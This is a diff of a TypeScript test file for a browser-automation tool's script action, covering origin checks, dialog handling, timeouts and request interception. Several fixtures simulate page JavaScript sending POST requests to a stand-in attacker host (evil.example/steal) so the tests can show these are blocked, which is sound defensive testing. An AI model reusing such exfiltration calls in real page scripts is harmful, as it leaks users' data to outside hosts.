@@ -1,4 +1,6 @@
-import { describe, expect, it } from 'vitest';
+import { Worker } from 'node:worker_threads';
+
+import { afterEach, describe, expect, it, vi } from 'vitest';
 
 import { BrowserCore } from '../src/index.js';
 import { runBrowserScriptWorker } from '../src/browser-script-worker.js';
@@ -17,6 +19,8 @@ class ScriptPageTransport implements BrowserTransport {
   readonly sessionId = 'script-page';
   readonly input: Array<Record<string, unknown>> = [];
   readonly page = { score: 0, held: new Set<string>() };
+  /** The page's location as page JavaScript sees it. */
+  location = { href: 'https://shop.example/cart', origin: 'https://shop.example', protocol: 'https:' };
   resets = 0;
   private evaluations = 0;
   /** Transport deadline requested for each Runtime.evaluate. */
@@ -37,7 +41,31 @@ class ScriptPageTransport implements BrowserTransport {
   terminateIneffective = false;
   /** This CDP method fails with a command timeout. */
   timeoutMethod?: string;
+  /** This CDP method fails with an ordinary (non-timeout) error. */
+  failMethod?: string;
+  /** This CDP command is sent and never answered, whatever its signal or deadline say. */
+  hangCommand?: (method: string, params: Record<string, unknown>) => boolean;
+  /** The answer to this CDP command waits for the returned promise. */
+  holdCommand?: (method: string, params: Record<string, unknown>) => Promise<void> | undefined;
+  /** Called as each other CDP command is sent. */
+  onCommand?: (method: string, params: Record<string, unknown>) => void;
+  /** Evaluations of this exact expression fail with a command timeout. */
+  timeoutEvaluate?: string;
+  /**
+   * Evaluations containing this text call confirm(): the page shows a confirm
+   * and the evaluation answers with its result once Page.handleJavaScriptDialog closes it.
+   */
+  confirmOn?: string;
+  private answerConfirm: ((accepted: boolean) => void) | undefined;
+  /** Commands sent while an event was being delivered, as Electron delivers it: on the sender's stack. */
+  readonly sentDuringEvent: string[] = [];
+  private delivering = false;
+  /** Settles when page JavaScript asks for interception: the script has really reached the page. */
+  readonly interceptionAsked = Promise.withResolvers<void>();
+  /** Every other CDP command, in order (Fetch.*, Network.*, ...). */
+  readonly commands: Array<{ method: string; params: Record<string, unknown> }> = [];
   terminations = 0;
+  private requests = 0;
   private readonly hung = new Set<(error: Error) => void>();
   private readonly listeners = new Set<BrowserTransportEventListener>();
 
@@ -68,6 +96,12 @@ class ScriptPageTransport implements BrowserTransport {
     _sessionId?: string,
     options?: BrowserTransportCommandOptions,
   ): Promise<T> {
+    if (this.delivering) this.sentDuringEvent.push(method);
+    if (method === 'Fetch.enable') this.interceptionAsked.resolve();
+    if (this.hangCommand?.(method, params)) {
+      this.commands.push({ method, params });
+      return Promise.withResolvers<T>().promise;
+    }
     if (options?.signal?.aborted) {
       throw Object.assign(new Error('ABORTED: command aborted'), { code: 'ABORTED' });
     }
@@ -76,6 +110,7 @@ class ScriptPageTransport implements BrowserTransport {
         code: 'BROWSER_OPERATION_TIMEOUT',
       });
     }
+    if (method === this.failMethod) throw new Error(`${method} is not allowed on this target`);
     if (method === 'Input.insertText') {
       this.input.push({ method, ...params });
       return {} as T;
@@ -110,11 +145,26 @@ class ScriptPageTransport implements BrowserTransport {
       this.hung.clear();
       return {} as T;
     }
+    if (method === 'Page.handleJavaScriptDialog') {
+      const answer = this.answerConfirm;
+      if (!answer) throw new Error('No dialog is showing');
+      this.answerConfirm = undefined;
+      for (const listener of [...this.listeners]) {
+        listener({ method: 'Page.javascriptDialogClosed', params: { result: params.accept } });
+      }
+      answer(params.accept === true);
+      return {} as T;
+    }
     if (method === 'Runtime.evaluate') {
       this.evaluations += 1;
       this.evaluateTimeouts.push(options?.timeoutMs);
       this.onEvaluate?.(this.evaluations);
       const expression = String(params.expression);
+      if (this.timeoutEvaluate && String(params.expression) === this.timeoutEvaluate) {
+        throw Object.assign(new Error('BROWSER_OPERATION_TIMEOUT: Runtime.evaluate'), {
+          code: 'BROWSER_OPERATION_TIMEOUT',
+        });
+      }
       if (this.hangOn && expression.includes(this.hangOn)) {
         // Like a sync loop in Chrome: aborting the command only stops waiting
         // for it; the page stays busy until Runtime.terminateExecution.
@@ -125,10 +175,34 @@ class ScriptPageTransport implements BrowserTransport {
         );
         return promise;
       }
+      if (this.confirmOn && expression.includes(this.confirmOn)) {
+        const answered = Promise.withResolvers<boolean>();
+        this.answerConfirm = answered.resolve;
+        for (const listener of [...this.listeners]) {
+          listener({
+            method: 'Page.javascriptDialogOpening',
+            params: { type: 'confirm', message: 'Empty the cart?', url: this.location.href, defaultPrompt: '' },
+          });
+        }
+        // Aborting the command stops waiting for it, as in Chrome; the page
+        // stays paused on the dialog until it is answered.
+        const aborted = Promise.withResolvers<never>();
+        options?.signal?.addEventListener('abort', () =>
+          aborted.reject(Object.assign(new Error('ABORTED: command aborted'), { code: 'ABORTED' })),
+        );
+        return { result: { value: await Promise.race([answered.promise, aborted.promise]) } } as T;
+      }
       if (this.hung.size > 0) throw new Error('page is busy');
       const page = this.page;
       // eslint-disable-next-line no-new-func -- test page stands in for Chrome's evaluator
-      const value = new Function('page', `return (${expression});`)(page);
+      const value = new Function('page', 'location', 'request', 'commit', `return (${expression});`)(
+        page,
+        this.location,
+        // A request the page JavaScript starts, as Chrome reports it to Fetch while it is intercepted.
+        (url: string, method: string) => this.emitPaused(url, method),
+        // The main frame commits a new document at `url`.
+        (url: string) => this.commitMainFrame(url),
+      );
       return { result: { value: await value } } as T;
     }
     if (method === 'Page.captureScreenshot') {
@@ -140,7 +214,29 @@ class ScriptPageTransport implements BrowserTransport {
     if (method === 'Page.getLayoutMetrics') {
       return { cssLayoutViewport: { clientWidth: 800, clientHeight: 600 } } as T;
     }
+    this.commands.push({ method, params });
+    this.onCommand?.(method, params);
+    await this.holdCommand?.(method, params);
     return {} as T;
+  }
+
+  emitPaused(url: string, method: string): string {
+    this.requests += 1;
+    const requestId = `interception-${this.requests}`;
+    this.delivering = true;
+    for (const listener of this.listeners) {
+      listener({ method: 'Fetch.requestPaused', params: { requestId, request: { url, method } } });
+    }
+    this.delivering = false;
+    return requestId;
+  }
+
+  commitMainFrame(url: string): void {
+    const next = new URL(url);
+    Object.assign(this.location, { href: next.href, origin: next.origin, protocol: next.protocol });
+    for (const listener of [...this.listeners]) {
+      listener({ method: 'Page.frameNavigated', params: { frame: { id: 'main', url: next.href } } });
+    }
   }
 
   get hungEvaluations(): number {
@@ -162,10 +258,12 @@ class ScriptPageTransport implements BrowserTransport {
 function createSession(
   transport: ScriptPageTransport,
   captureGate: Promise<void> = Promise.resolve(),
+  onCapture: () => void = () => undefined,
 ) {
   const core = new BrowserCore({ provider: 'test', version: 1, actions: ['run_script'] as const });
   return core.createSession(transport, {
     captureScreenshot: async () => {
+      onCapture();
       await captureGate;
       return { data: Buffer.from('fake-png').toString('base64'), format: 'png', width: 800, height: 600 };
     },
@@ -180,6 +278,7 @@ type ScriptResult = {
   error?: { name: string; message: string; location?: { line: number; column: number } };
   pageEvaluate: { calls: number; sites: Array<{ api: string; line: number; calls: number }> };
   input: { keyEvents: number; mouseEvents: number; autoReleased: string[] };
+  inputApiCalls: number;
   screenshots: Array<{ label: string; reason: string }>;
 };
 
@@ -362,6 +461,70 @@ describe('Browser run_script', () => {
     ]);
   });
 
+  it('ends at a confirm its page JavaScript opens, keeps the connection, and runs again after handle_js_dialog', async () => {
+    const transport = new ScriptPageTransport();
+    transport.confirmOn = 'confirmEmptyCart';
+    const session = createSession(transport);
+    const startedAt = Date.now();
+
+    const result = (await session.execute('run_script', {
+      code: 'return await page.evaluate(() => "confirmEmptyCart" && page.score);',
+      timeout: 20_000,
+    })) as Record<string, unknown>;
+
+    // Well before the 20 s script deadline: the dialog ends the action.
+    expect(Date.now() - startedAt).toBeLessThan(5_000);
+    const dialogId = session.jsDialog?.dialogId;
+    expect(result).toMatchObject({
+      success: false,
+      code: 'BROWSER_JS_DIALOG_ACTIVE',
+      dialog: { dialogId, type: 'confirm' },
+      trigger: 'run_script',
+      retryable: false,
+    });
+    expect(transport.resets).toBe(0);
+    expect(session.requiresRecreation).toBe(false);
+
+    await session.execute('inspect', {});
+    expect(await session.execute('handle_js_dialog', { dialogId, action: 'accept' })).toEqual({
+      success: true,
+      handled: true,
+      type: 'confirm',
+      action: 'accept',
+    });
+    expect(session.jsDialog).toBeNull();
+
+    transport.page.score = 7;
+    const next = (await session.execute('run_script', {
+      code: 'return await page.evaluate(() => page.score);',
+    })) as ScriptResult;
+    expect(next).toMatchObject({ success: true, value: 7 });
+    expect(transport.resets).toBe(0);
+    // The interrupted page.evaluate was not terminated: that would kill the
+    // page code that runs after the confirm is answered.
+    expect(transport.terminations).toBe(0);
+    expect(session.requiresRecreation).toBe(false);
+  });
+
+  it('counts keyboard and mouse API calls, including insertText and refused calls', async () => {
+    const reading = await run(
+      new ScriptPageTransport(),
+      'await page.screenshot();\nreturn await page.evaluate(() => page.score);',
+    );
+    const typing = await run(
+      new ScriptPageTransport(),
+      // insertText dispatches no key event; mouse.down without a position is refused.
+      "await page.keyboard.insertText('hi');\ntry { await page.mouse.down(); } catch {}\nreturn 1;",
+    );
+
+    expect(reading).toMatchObject({ success: true, inputApiCalls: 0 });
+    expect(typing).toMatchObject({
+      success: true,
+      inputApiCalls: 2,
+      input: { keyEvents: 0, mouseEvents: 0 },
+    });
+  });
+
   it('reports failed assertions with the script line', async () => {
     const transport = new ScriptPageTransport();
     const result = await run(transport, `const n = 1;\nassert.equal(n, 2, 'mismatch count');`, {
@@ -442,6 +605,7 @@ describe('Browser run_script', () => {
         omitted += count;
       },
       onSettle: () => undefined,
+      onStalled: () => undefined,
     });
 
     // Only the quota crosses the thread boundary; the rest is counted.
@@ -767,13 +931,37 @@ describe('Browser run_script', () => {
     ).toEqual([['mouseMoved', 120, 80, 0]]);
   });
 
+  it('presents each scripted destination once before dispatching all interpolated input', async () => {
+    const transport = new ScriptPageTransport();
+    const cursor: Array<{ x: number; y: number }> = [];
+    const core = new BrowserCore({ provider: 'test', version: 1, actions: ['run_script'] as const });
+    const session = core.createSession(transport, {
+      beforePointerAction: ({ point }) => { cursor.push(point); },
+    });
+    const moves: Array<{ x: unknown; y: unknown }> = [];
+    transport.onInput = (event) => {
+      if (event.type === 'mouseMoved') {
+        expect(cursor.at(-1)).toEqual(moves.length === 0 ? { x: 40, y: 60 } : { x: 120, y: 80 });
+        moves.push({ x: event.x, y: event.y });
+      }
+    };
+    const result = await session.execute('run_script', {
+      code: 'await page.mouse.move(40, 60); await page.mouse.move(120, 80, {steps: 100});',
+    });
+    expect(moves).toHaveLength(101);
+    expect(moves.at(-1)).toEqual({ x: 120, y: 80 });
+    expect(result).toMatchObject({ success: true });
+    expect(cursor).toEqual([{ x: 40, y: 60 }, { x: 120, y: 80 }]);
+  });
+
   it('keeps the interrupted page.evaluate warning when the action ends with a cancellation', async () => {
     const transport = new ScriptPageTransport();
     transport.hangOn = 'pendingContinuation';
     const controller = new AbortController();
     transport.onEvaluate = (count) => {
-      // Cancel once the long-running page function has been sent.
-      if (count >= 1) queueMicrotask(() => controller.abort());
+      // Cancel once the long-running page function has been sent (the first
+      // evaluation reads the page URL for request interception).
+      if (count >= 2) queueMicrotask(() => controller.abort());
     };
 
     await expect(
@@ -784,5 +972,562 @@ describe('Browser run_script', () => {
         controller.signal,
       ),
     ).rejects.toThrow(/cancelled.*did not finish and may still change the page/su);
+  });
+});
+
+type GuardedResult = ScriptResult & {
+  error?: { code?: string; message: string };
+  pageScript?: {
+    origins: string[];
+    calls: number;
+    requests: Array<{ method: string; url: string; blocked?: true }>;
+    requestCount: number;
+    nonGetRequests: number;
+    blockedRequests: number;
+    writeLike: boolean;
+    durationMs: number;
+  };
+  uncertainWrite?: { reason: string; message: string };
+};
+
+function fetchCommands(transport: ScriptPageTransport): string[] {
+  return transport.commands
+    .filter((command) => command.method.startsWith('Fetch.'))
+    .map((command) => command.method);
+}
+
+describe('run_script page JavaScript guards', () => {
+  const tamper = 'return await page.evaluate(() => { page.score = 99; return page.score; });';
+
+  it('runs page JavaScript on the current web page without any host allow-list', async () => {
+    const transport = new ScriptPageTransport();
+    const result = (await run(transport, tamper)) as GuardedResult;
+    expect(result).toMatchObject({ success: true, value: 99 });
+    expect(result.pageScript?.origins).toEqual(['https://shop.example']);
+  });
+
+  it('checks the origin in the same evaluation: a page that moved runs nothing', async () => {
+    const transport = new ScriptPageTransport();
+    // The URL read for interception still sees the first page; the call does not.
+    transport.onEvaluate = (count) => {
+      if (count === 2) transport.location = { href: 'https://evil.example/', origin: 'https://evil.example', protocol: 'https:' };
+    };
+    const result = (await run(transport, tamper)) as GuardedResult;
+    expect(result.error?.code).toBe('PAGE_EVALUATE_FAILED');
+    expect(result.error?.message).toContain('https://evil.example');
+    expect(transport.page.score).toBe(0);
+    // The window it opened was closed again.
+    expect(fetchCommands(transport)).toEqual(['Fetch.enable', 'Fetch.enable', 'Fetch.disable']);
+  });
+
+  it('runs nothing on a page that is not a web page', async () => {
+    for (const protocol of ['about:', 'data:', 'file:'] as const) {
+      const transport = new ScriptPageTransport();
+      transport.location = { href: `${protocol}x`, origin: 'null', protocol };
+      const result = (await run(transport, tamper)) as GuardedResult;
+      expect(result.error?.code).toBe('PAGE_SCRIPT_UNSUPPORTED_PAGE');
+      expect(transport.page.score).toBe(0);
+      expect(fetchCommands(transport)).toEqual([]);
+    }
+  });
+
+  it('fails requests to another site while page JavaScript runs and audits its effects', async () => {
+    const transport = new ScriptPageTransport();
+    const code = [
+      'return await page.evaluate(() => {',
+      '  request("https://shop.example/api/cart", "GET");',
+      '  request("https://evil.example/steal?d=1", "POST");',
+      '  request("https://cdn.shop.example/a.js", "GET");',
+      '  return 1;',
+      '});',
+    ].join('\n');
+    const result = (await run(transport, code)) as GuardedResult;
+    expect(result).toMatchObject({ success: true, value: 1 });
+    const failed = transport.commands.filter((command) => command.method === 'Fetch.failRequest');
+    expect(failed).toEqual([
+      {
+        method: 'Fetch.failRequest',
+        params: { requestId: 'interception-2', errorReason: 'BlockedByClient' },
+      },
+    ]);
+    expect(
+      transport.commands.filter((command) => command.method === 'Fetch.continueRequest'),
+    ).toHaveLength(2);
+    expect(fetchCommands(transport).at(-1)).toBe('Fetch.disable');
+    expect(result.pageScript).toMatchObject({
+      origins: ['https://shop.example'],
+      calls: 1,
+      requestCount: 3,
+      blockedRequests: 1,
+      // The refused POST never left the browser.
+      nonGetRequests: 0,
+      writeLike: false,
+    });
+    expect(result.pageScript?.requests).toContainEqual({
+      method: 'POST',
+      url: 'https://evil.example/steal',
+      blocked: true,
+    });
+    expect(typeof result.pageScript?.durationMs).toBe('number');
+    expect(result.uncertainWrite).toBeUndefined();
+  });
+
+  it('a same-site POST makes the next write wait for a read', async () => {
+    const transport = new ScriptPageTransport();
+    const core = new BrowserCore({
+      provider: 'test',
+      version: 1,
+      actions: ['run_script', 'click', 'screenshot'] as const,
+    });
+    const session = core.createSession(transport, {
+      captureScreenshot: async () => ({
+        data: Buffer.from('fake-png').toString('base64'),
+        format: 'png',
+        width: 800,
+        height: 600,
+      }),
+    });
+    const posted = (await session.execute('run_script', {
+      code: 'return await page.evaluate(() => { request("https://shop.example/api/save", "POST"); return "sent"; });',
+    })) as GuardedResult;
+    expect(posted).toMatchObject({
+      success: true,
+      value: 'sent',
+      pageScript: { nonGetRequests: 1, writeLike: true },
+      uncertainWrite: { reason: 'page_script' },
+    });
+
+    const refused = session.execute('click', { position: { x: 10, y: 10 } });
+    await expect(refused).rejects.toThrow(/UNVERIFIED_WRITE_RETRY/u);
+    await expect(refused).rejects.toThrow(/page JavaScript sent a write request/u);
+    expect(transport.input.filter((event) => event.method === 'Input.dispatchMouseEvent')).toEqual(
+      [],
+    );
+
+    await session.execute('screenshot', {});
+    await session
+      .execute('click', { position: { x: 10, y: 10 } })
+      .catch((error: unknown) => expect(String(error)).not.toContain('UNVERIFIED_WRITE_RETRY'));
+  });
+
+  it('does not run when request interception cannot be enabled', async () => {
+    const transport = new ScriptPageTransport();
+    transport.failMethod = 'Fetch.enable';
+    const result = (await run(transport, tamper)) as GuardedResult;
+    expect(result.error?.code).toBe('PAGE_SCRIPT_UNAVAILABLE');
+    expect(transport.page.score).toBe(0);
+  });
+
+  it('shares one interception window between concurrent calls and always ends it', async () => {
+    const transport = new ScriptPageTransport();
+    const result = (await run(
+      transport,
+      'return await Promise.all([page.evaluate(() => page.score), page.evaluate(() => page.score + 1), page.waitForFunction(() => true)]);',
+    )) as GuardedResult;
+    expect(result).toMatchObject({ success: true, value: [0, 1, true] });
+    const fetch = fetchCommands(transport);
+    const opened = transport.commands.filter(
+      ({ method, params }) =>
+        method === 'Fetch.enable' && Array.isArray(params.patterns) && params.patterns.length > 0,
+    );
+    expect(opened.length).toBe(fetch.filter((method) => method === 'Fetch.disable').length);
+    expect(fetch.at(-1)).toBe('Fetch.disable');
+    expect(result.pageScript?.calls).toBe(3);
+  });
+
+  it('limits the size of page.evaluate source and results', async () => {
+    const big = (await run(
+      new ScriptPageTransport(),
+      'return await page.evaluate(() => "x".repeat(300 * 1024));',
+    )) as GuardedResult;
+    expect(big.error?.code).toBe('EVALUATE_RESULT_TOO_LARGE');
+    const long = (await run(
+      new ScriptPageTransport(),
+      `return await page.evaluate(() => ${JSON.stringify('y'.repeat(70 * 1024))}.length);`,
+    )) as GuardedResult;
+    expect(long.error?.code).toBe('EVALUATE_SOURCE_TOO_LARGE');
+  });
+});
+
+/** The second Fetch.enable of a window: new requests are no longer intercepted. */
+function stopsIntercepting(method: string, params: Record<string, unknown>): boolean {
+  return method === 'Fetch.enable' && Array.isArray(params.patterns) && params.patterns.length === 0;
+}
+
+async function nextTurn(): Promise<void> {
+  const { promise, resolve } = Promise.withResolvers<void>();
+  setImmediate(resolve);
+  await promise;
+}
+
+/**
+ * Runs `execution` to its end on a fake clock and returns the time it took on
+ * that clock. setImmediate and the script's Worker stay real, and the clock
+ * starts at `reached`: moved earlier, it would pass the script's deadline before
+ * the Worker is up, and the step under test would never run.
+ */
+async function fakeClockMs(
+  reached: Promise<void>,
+  execution: () => Promise<unknown>,
+): Promise<number> {
+  const startedAt = Date.now();
+  let settled = false;
+  const settle = (): void => {
+    settled = true;
+  };
+  execution().then(settle, settle);
+  await reached;
+  while (!settled) {
+    await vi.advanceTimersByTimeAsync(20);
+    await nextTurn();
+  }
+  return Date.now() - startedAt;
+}
+
+/** Real time a run may still take, with the fake clock held at its budget, to finish its cleanup. */
+const REAL_SETTLE_MS = 2_000;
+
+/** Worker.terminate calls still running; see endsWithinFakeMs. */
+let terminatingWorkers = 0;
+
+/** Counts the script Worker's terminate calls until they end. */
+function trackWorkerTerminations(): void {
+  const terminate = Worker.prototype.terminate;
+  vi.spyOn(Worker.prototype, 'terminate').mockImplementation(function (this: Worker) {
+    terminatingWorkers += 1;
+    return terminate.call(this).finally(() => {
+      terminatingWorkers -= 1;
+    });
+  });
+}
+
+/**
+ * Whether `execution` ends without the fake clock passing `budgetMs` (counted
+ * from the start, like fakeClockMs). Once the run reached its hung call it
+ * waits only on fake timers, except while the script Worker terminates after
+ * the script deadline: that is real thread work, slow on a loaded runner, and
+ * the clock holds still until it ends, so the cleanup timers armed after it
+ * start at the same fake time on every machine. The clock moves in 20 ms steps
+ * only up to the budget; a run that needs a timer beyond it never ends here
+ * and returns false.
+ */
+async function endsWithinFakeMs(
+  reached: Promise<void>,
+  execution: () => Promise<unknown>,
+  budgetMs: number,
+): Promise<boolean> {
+  trackWorkerTerminations();
+  const startedAt = Date.now();
+  let settled = false;
+  const settle = (): void => {
+    settled = true;
+  };
+  execution().then(settle, settle);
+  await reached;
+  while (!settled && Date.now() - startedAt < budgetMs) {
+    if (terminatingWorkers === 0) {
+      await vi.advanceTimersByTimeAsync(Math.min(20, budgetMs - (Date.now() - startedAt)));
+    }
+    await nextTurn();
+  }
+  const realDeadline = performance.now() + REAL_SETTLE_MS;
+  while (!settled && performance.now() < realDeadline) await nextTurn();
+  return settled;
+}
+
+describe('run_script Fetch window', () => {
+  const SCRIPT_MS = 30_000;
+  const CLEANUP_MS = 5_000;
+  const crossSitePost = 'request("https://evil.example/steal", "POST")';
+
+  afterEach(() => {
+    vi.useRealTimers();
+    vi.restoreAllMocks();
+  });
+
+  it('answers a paused request after its event, never while Electron delivers it', async () => {
+    const transport = new ScriptPageTransport();
+    const result = (await run(
+      transport,
+      `return await page.evaluate(() => { ${crossSitePost}; request("https://shop.example/a", "GET"); return 1; });`,
+    )) as GuardedResult;
+    expect(result).toMatchObject({ success: true, value: 1 });
+    expect(transport.sentDuringEvent).toEqual([]);
+    expect(fetchCommands(transport)).toContain('Fetch.failRequest');
+    expect(fetchCommands(transport)).toContain('Fetch.continueRequest');
+  });
+
+  it('stops taking requests first and disables only after the paused ones are answered', async () => {
+    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
+    const transport = new ScriptPageTransport();
+    const answer = Promise.withResolvers<void>();
+    const closing = Promise.withResolvers<void>();
+    transport.holdCommand = (method) =>
+      method === 'Fetch.continueRequest' ? answer.promise : undefined;
+    transport.onCommand = (method, params) => {
+      if (stopsIntercepting(method, params)) closing.resolve();
+    };
+    const execution = run(
+      transport,
+      'return await page.evaluate(() => { request("https://shop.example/a", "GET"); return 1; });',
+      { timeout: SCRIPT_MS },
+    );
+    await fakeClockMs(transport.interceptionAsked.promise, () => closing.promise);
+    // Well inside the drain: the answer is still open, so nothing may be disabled.
+    await vi.advanceTimersByTimeAsync(500);
+    expect(fetchCommands(transport)).not.toContain('Fetch.disable');
+    answer.resolve();
+    await fakeClockMs(transport.interceptionAsked.promise, () => execution);
+    expect(fetchCommands(transport).at(-1)).toBe('Fetch.disable');
+    expect(fetchCommands(transport).filter((method) => method === 'Fetch.continueRequest')).toHaveLength(1);
+  });
+
+  it('still refuses a request to another site that pauses while the window closes', async () => {
+    const transport = new ScriptPageTransport();
+    let requestId = '';
+    transport.onCommand = (method, params) => {
+      if (stopsIntercepting(method, params)) {
+        requestId = transport.emitPaused('https://evil.example/late', 'POST');
+      }
+    };
+    const result = (await run(transport, 'return await page.evaluate(() => 1);')) as GuardedResult;
+    expect(result.pageScript?.blockedRequests).toBe(1);
+    const methods = fetchCommands(transport);
+    expect(methods.indexOf('Fetch.failRequest')).toBeGreaterThan(-1);
+    expect(methods.indexOf('Fetch.failRequest')).toBeLessThan(methods.indexOf('Fetch.disable'));
+    expect(transport.commands.find(({ method }) => method === 'Fetch.failRequest')?.params).toEqual({
+      requestId,
+      errorReason: 'BlockedByClient',
+    });
+  });
+
+  it('does not answer a request paused after Fetch.disable, and does not call it blocked', async () => {
+    const transport = new ScriptPageTransport();
+    transport.onCommand = (method) => {
+      if (method === 'Fetch.disable') transport.emitPaused('https://evil.example/late', 'POST');
+    };
+    const result = (await run(transport, 'return await page.evaluate(() => 1);')) as GuardedResult;
+    expect(result).toMatchObject({ success: true, value: 1 });
+    const methods = fetchCommands(transport);
+    expect(methods).not.toContain('Fetch.failRequest');
+    expect(methods).not.toContain('Fetch.continueRequest');
+    expect(result.pageScript?.blockedRequests).toBe(0);
+    expect(JSON.stringify(result.pageScript?.requests)).toContain('evil.example/late');
+  });
+
+  it('repeats an unconfirmed answer once when the drain runs out, then disables', async () => {
+    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
+    const transport = new ScriptPageTransport();
+    transport.hangCommand = (method) => method === 'Fetch.continueRequest';
+    let result: unknown;
+    await fakeClockMs(transport.interceptionAsked.promise, async () => {
+      result = await run(
+        transport,
+        'return await page.evaluate(() => { request("https://shop.example/a", "GET"); return 1; });',
+        { timeout: SCRIPT_MS },
+      );
+    });
+    expect(result).toBeDefined();
+    const methods = fetchCommands(transport);
+    expect(methods.filter((method) => method === 'Fetch.continueRequest')).toHaveLength(2);
+    expect(methods.at(-1)).toBe('Fetch.disable');
+  });
+
+  it.each(['Fetch.continueRequest', 'Fetch.failRequest', 'Fetch.disable'])(
+    'ends with a structured error inside its deadline when %s is never answered',
+    async (hung) => {
+      vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
+      const transport = new ScriptPageTransport();
+      transport.hangOn = 'still-running';
+      transport.hangCommand = (method) => method === hung;
+      let outcome: unknown;
+      const ended = await endsWithinFakeMs(
+        transport.interceptionAsked.promise,
+        async () => {
+          outcome = await run(
+            transport,
+            `return await Promise.all([
+  page.evaluate(() => { ${crossSitePost}; request("https://shop.example/a", "GET"); return 1; }),
+  page.evaluate(() => "still-running"),
+]);`,
+            { timeout: SCRIPT_MS },
+          ).catch((error: unknown) => error);
+        },
+        SCRIPT_MS + CLEANUP_MS,
+      );
+      expect(ended).toBe(true);
+      expect(outcome).toMatchObject({
+        code: expect.stringMatching(/^(SCRIPT_TIMEOUT|BROWSER_OPERATION_TIMEOUT)$/u),
+      });
+    },
+  );
+
+  it('ends inside its deadline when a call hangs before the page: Fetch.enable is never answered', async () => {
+    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
+    const transport = new ScriptPageTransport();
+    transport.hangCommand = (method) => method === 'Fetch.enable';
+    let outcome: unknown;
+    const ended = await endsWithinFakeMs(
+      transport.interceptionAsked.promise,
+      async () => {
+        outcome = await run(transport, 'return await page.evaluate(() => 1);', {
+          timeout: SCRIPT_MS,
+        }).catch((error: unknown) => error);
+      },
+      SCRIPT_MS + CLEANUP_MS,
+    );
+    expect(ended).toBe(true);
+    expect(outcome).toMatchObject({ code: 'BROWSER_OPERATION_TIMEOUT' });
+  });
+
+  it.each([
+    ['Runtime.evaluate', 'return await page.evaluate(() => 1);'],
+    ['Input.dispatchMouseEvent', 'await page.mouse.click(10, 10); return 1;'],
+  ])('ends inside its deadline when %s is never answered', async (hung, code) => {
+    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
+    const transport = new ScriptPageTransport();
+    const reached = Promise.withResolvers<void>();
+    transport.hangCommand = (method) => {
+      if (method !== hung) return false;
+      reached.resolve();
+      return true;
+    };
+    let outcome: unknown;
+    const ended = await endsWithinFakeMs(
+      reached.promise,
+      async () => {
+        outcome = await run(transport, code, { timeout: SCRIPT_MS }).catch(
+          (error: unknown) => error,
+        );
+      },
+      SCRIPT_MS + CLEANUP_MS,
+    );
+    expect(ended).toBe(true);
+    expect(outcome).toMatchObject({ code: 'BROWSER_OPERATION_TIMEOUT' });
+  });
+
+  it('ends a window whose call never came back: no listener answers a request paused afterwards', async () => {
+    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
+    const transport = new ScriptPageTransport();
+    const reached = Promise.withResolvers<void>();
+    transport.hangCommand = (method, params) => {
+      if (method !== 'Runtime.evaluate' || !String(params.expression).includes('never-returns')) {
+        return false;
+      }
+      reached.resolve();
+      return true;
+    };
+    await fakeClockMs(reached.promise, () =>
+      run(transport, 'return await page.evaluate(() => "never-returns");', {
+        timeout: SCRIPT_MS,
+      }).catch((error: unknown) => error),
+    );
+    expect(fetchCommands(transport).at(-1)).toBe('Fetch.disable');
+    const answered = fetchCommands(transport).length;
+    transport.emitPaused('https://evil.example/late', 'POST');
+    await nextTurn();
+    expect(fetchCommands(transport)).toHaveLength(answered);
+  });
+
+  it('gives up a script at the action deadline whatever keeps it from returning', async () => {
+    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
+    const transport = new ScriptPageTransport();
+    // A failed script takes a screenshot; this one never comes back.
+    const captured = Promise.withResolvers<void>();
+    const session = createSession(transport, Promise.withResolvers<void>().promise, captured.resolve);
+    let outcome: unknown;
+    await fakeClockMs(captured.promise, async () => {
+      outcome = await session
+        .execute('run_script', { code: 'throw new Error("failed");', timeout: SCRIPT_MS })
+        .catch((error: unknown) => error);
+    });
+    expect(String(outcome)).toContain(`ACTION_TIMEOUT: Browser action exceeded ${SCRIPT_MS + CLEANUP_MS}ms`);
+  });
+
+  it('leaves no unhandled rejection when the page URL cannot be read during a navigation', async () => {
+    const transport = new ScriptPageTransport();
+    transport.timeoutEvaluate = 'location.href';
+    const unhandled: unknown[] = [];
+    const record = (reason: unknown): void => {
+      unhandled.push(reason);
+    };
+    process.on('unhandledRejection', record);
+    try {
+      await run(transport, 'return await page.evaluate(() => 1);').catch(
+        () => undefined,
+      );
+      // Node reports an unhandled rejection after the microtask queue drains.
+      await nextTurn();
+    } finally {
+      process.off('unhandledRejection', record);
+    }
+    expect(unhandled).toEqual([]);
+  });
+
+  it('a call that comes after the main frame committed a new document opens its own window on the new site', async () => {
+    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'Date'] });
+    const transport = new ScriptPageTransport();
+    // The first call navigates and stays in its window a while, as an awaiting
+    // call does until Chrome reports its document gone.
+    const code = `
+      const first = page.evaluate(() => { commit("https://other.example/p2"); return new Promise((resolve) => setTimeout(resolve, 1000, "first")); });
+      await page.waitForFunction(() => location.origin === "https://other.example");
+      const second = await page.evaluate(() => { request("https://other.example/api", "GET"); request("https://shop.example/x", "GET"); return "second"; });
+      return [await first, second];`;
+    let result: GuardedResult | undefined;
+    await fakeClockMs(transport.interceptionAsked.promise, async () => {
+      result = (await run(transport, code, {
+        timeout: SCRIPT_MS,
+      })) as GuardedResult;
+    });
+    expect(result).toMatchObject({ success: true, value: ['first', 'second'] });
+    // The new page's own request goes out; the old site is another site now.
+    expect(result?.pageScript?.requests).toContainEqual({
+      method: 'GET',
+      url: 'https://other.example/api',
+    });
+    expect(result?.pageScript?.requests).toContainEqual({
+      method: 'GET',
+      url: 'https://shop.example/x',
+      blocked: true,
+    });
+    expect(result?.pageScript?.origins).toEqual(['https://shop.example', 'https://other.example']);
+    expect(fetchCommands(transport).at(-1)).toBe('Fetch.disable');
+  });
+
+  it('a window still opening when the script ends never starts intercepting', async () => {
+    const transport = new ScriptPageTransport();
+    const held = Promise.withResolvers<void>();
+    const reached = Promise.withResolvers<void>();
+    // The window's main-frame lookup answers only after the action returned.
+    let armed = false;
